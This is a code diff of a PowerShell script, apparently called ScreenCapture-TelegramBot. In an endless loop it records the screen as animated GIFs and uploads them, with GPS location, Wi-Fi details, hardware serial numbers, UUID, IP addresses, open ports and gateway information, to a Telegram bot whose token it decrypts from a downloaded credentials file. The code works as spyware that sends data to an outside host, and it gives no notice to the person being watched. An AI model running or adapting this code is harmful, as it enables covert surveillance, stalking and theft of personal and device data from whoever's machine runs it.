@@ -1,20 +1,17 @@
-# --- Fallback for $PSScriptRoot when running via IEX or from a remote source ---
-if (-not $PSScriptRoot -or $PSScriptRoot -eq '') {
-    $PSScriptRoot = (Get-Location).Path
+# --- Define a local base directory in APPDATA for storing files ---
+$LocalBase = Join-Path $env:APPDATA "ScreenCaptureTelegramBot"
+if (-not (Test-Path $LocalBase)) {
+    New-Item -ItemType Directory -Path $LocalBase | Out-Null
 }
 
-# ===============================
+# ------------------------------
 # Attempt to Download cred.dat from GitHub if Not Present Locally
-# ===============================
-$CredFile = Join-Path $PSScriptRoot "src\cred.dat"
+# ------------------------------
+$CredFile = Join-Path $LocalBase "cred.dat"
 if (-not (Test-Path $CredFile)) {
     Write-Host "cred.dat not found locally. Attempting to download from GitHub..."
     try {
         $remoteCredUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
-        $credFolder = Split-Path $CredFile
-        if (-not (Test-Path $credFolder)) {
-            New-Item -ItemType Directory -Path $credFolder | Out-Null
-        }
         Invoke-WebRequest -Uri $remoteCredUrl -OutFile $CredFile -UseBasicParsing
         Write-Host "Downloaded cred.dat successfully."
     }
@@ -23,9 +20,9 @@ if (-not (Test-Path $CredFile)) {
     }
 }
 
-# ===============================
+# ------------------------------
 # Function: Get Passphrase from Environment or Prompt
-# ===============================
+# ------------------------------
 function Get-Passphrase {
     if ($env:MY_CRED_PASSPHRASE) {
         return $env:MY_CRED_PASSPHRASE
@@ -39,9 +36,9 @@ function Get-Passphrase {
     }
 }
 
-# ===============================
+# ------------------------------
 # AES Encryption / Decryption Functions (Cross-Machine)
-# ===============================
+# ------------------------------
 function Encrypt-String {
     param (
         [Parameter(Mandatory)]
@@ -102,9 +99,9 @@ function Decrypt-String {
     return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
 }
 
-# ===============================
+# ------------------------------
 # Credential Handling (Using AES Encryption)
-# ===============================
+# ------------------------------
 function Get-Credentials {
     param (
         [string]$CredFile
@@ -139,14 +136,23 @@ function Get-Credentials {
     }
 }
 
-# Retrieve credentials (if cred.dat is available, this will load without prompting for token/chat id)
+# Retrieve credentials (this will load your token and chat id if cred.dat exists)
 $Creds = Get-Credentials -CredFile $CredFile
 $BotToken = $Creds.BotToken
 $ChatID   = $Creds.ChatID
 
-# ===============================
+# ------------------------------
+# Enable DPI Awareness to Capture Full Resolution on High DPI Screens
+# ------------------------------
+Add-Type -MemberDefinition @"
+    [DllImport("user32.dll")]
+    public static extern bool SetProcessDPIAware();
+"@ -Name NativeMethods -Namespace MyNamespace
+[MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null
+
+# ------------------------------
 # Function: Capture a Single Screenshot Frame as a BitmapSource
-# ===============================
+# ------------------------------
 function Capture-Frame {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -174,9 +180,9 @@ function Capture-Frame {
     return $bitmapSource
 }
 
-# ===============================
+# ------------------------------
 # Function: Capture an Animated GIF of the Screen over a Given Duration
-# ===============================
+# ------------------------------
 function Capture-AnimatedGIF {
     param(
         [int]$durationSeconds = 10,
@@ -193,24 +199,22 @@ function Capture-AnimatedGIF {
         $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
         Start-Sleep -Seconds $frameInterval
     }
-    $gifPath = Join-Path $PSScriptRoot "screenrecord.gif"
+    $gifPath = Join-Path $LocalBase "screenrecord.gif"
     $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
     $encoder.Save($fs)
     $fs.Close()
     return $gifPath
 }
 
-# ===============================
+# ------------------------------
 # Function: Send an Animation (GIF) to the Telegram Bot
-# ===============================
+# ------------------------------
 function Send-TelegramAnimation {
     param (
         [string]$GifPath
     )
     
     $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
-    
-    # Create a boundary for multipart/form-data
     $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
     $LF = "`r`n"
     
@@ -258,9 +262,9 @@ function Send-TelegramAnimation {
     $Response.Close()
 }
 
-# ===============================
+# ------------------------------
 # Function: Send a Text Message to the Telegram Bot
-# ===============================
+# ------------------------------
 function Send-TelegramMessage {
     param (
         [string]$Message
@@ -278,25 +282,21 @@ function Send-TelegramMessage {
     }
 }
 
-# ===============================
+# ------------------------------
 # Function: Get Native GPS Location using Windows Location Services
-# ===============================
+# ------------------------------
 Add-Type -AssemblyName System.Device
 function Get-WindowsGeolocation {
     $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
     $watcher.Start()
-    
-    # Wait for location acquisition (max 30 seconds)
     $timeout = 30
     while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
         Start-Sleep -Milliseconds 100
         $timeout--
     }
-
     if ($watcher.Position.Location.IsUnknown) {
         return $null
     }
-
     return @{
         Latitude = $watcher.Position.Location.Latitude
         Longitude = $watcher.Position.Location.Longitude
@@ -304,20 +304,18 @@ function Get-WindowsGeolocation {
     }
 }
 
-# ===============================
+# ------------------------------
 # Function: Get Complete System & Network Information
-# ===============================
+# ------------------------------
 function Get-CompleteSystemInfo {
     $computerName = $env:COMPUTERNAME
     $osInstance = Get-CimInstance Win32_OperatingSystem
     $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
     $dateTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-
     $basicInfo = "=== Basic System Information ===`n" +
                  "Computer Name: $computerName`n" +
                  "OS: $osInfo`n" +
                  "Date/Time: $dateTime`n"
-
     try {
         $wifiOutput = netsh wlan show interfaces | Out-String
         $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
@@ -330,7 +328,6 @@ function Get-CompleteSystemInfo {
         $signal = "N/A"
     }
     $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"
-
     $geo = Get-WindowsGeolocation
     if ($geo) {
         $latitude = $geo.Latitude
@@ -342,12 +339,10 @@ function Get-CompleteSystemInfo {
         $locationInfo = "Location unavailable. Ensure Location Services are enabled."
     }
     $locationSection = "GPS Location: $locationInfo`n"
-
     $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
     $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
     $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
     $enclosure = Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object SerialNumber, ChassisTypes
-
     $systemInfoSection = "=== Detailed System Information ===`n" +
                          "Manufacturer: $($cs.Manufacturer)`n" +
                          "Model (Friendly Name): $($cs.Model)`n" +
@@ -366,7 +361,6 @@ function Get-CompleteSystemInfo {
                       "  Identifying Number (SN): $($csp.IdentifyingNumber)`n" +
                       "  UUID: $($csp.UUID)`n" +
                       "  Vendor: $($csp.Vendor)`n"
-
     $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                    Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                    Select-Object InterfaceAlias, IPAddress, PrefixLength
@@ -374,7 +368,6 @@ function Get-CompleteSystemInfo {
     foreach ($ip in $ipAddresses) {
         $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress) / $($ip.PrefixLength)`n"
     }
-
     try {
         $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
         if ($wifiAdapter) {
@@ -392,10 +385,9 @@ function Get-CompleteSystemInfo {
     catch {
         $wifiSection = "`nError retrieving WiFi information`n"
     }
-
     try {
         $listeningPorts = Get-NetTCPConnection -State Listen | 
-                          Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
+                          Where-Object { $_.LocalAddress -ne '127.*' } |
                           Select-Object LocalAddress, LocalPort, 
                               @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}},
                               OwningProcess
@@ -407,26 +399,23 @@ function Get-CompleteSystemInfo {
     catch {
         $portsSection = "`nError retrieving open ports information`n"
     }
-
     $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
     $adaptersSection = "`nNetwork Adapters:`n"
     foreach ($adapter in $adapters) {
         $adaptersSection += "Name: $($adapter.Name), Description: $($adapter.InterfaceDescription), LinkSpeed: $($adapter.LinkSpeed)`n"
     }
-
     $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
     $gatewaySection = "`nDefault Gateway:`n"
     foreach ($route in $defaultGateway) {
         $gatewaySection += "NextHop: $($route.NextHop), Interface: $($route.InterfaceAlias)`n"
     }
-
     $completeInfo = $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
     return $completeInfo
 }
 
-# ===============================
+# ------------------------------
 # Main Loop: Capture & Send a 10-Second Screen Recording and System Info
-# ===============================
+# ------------------------------
 while ($true) {
     $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
     Send-TelegramAnimation -GifPath $gifPath
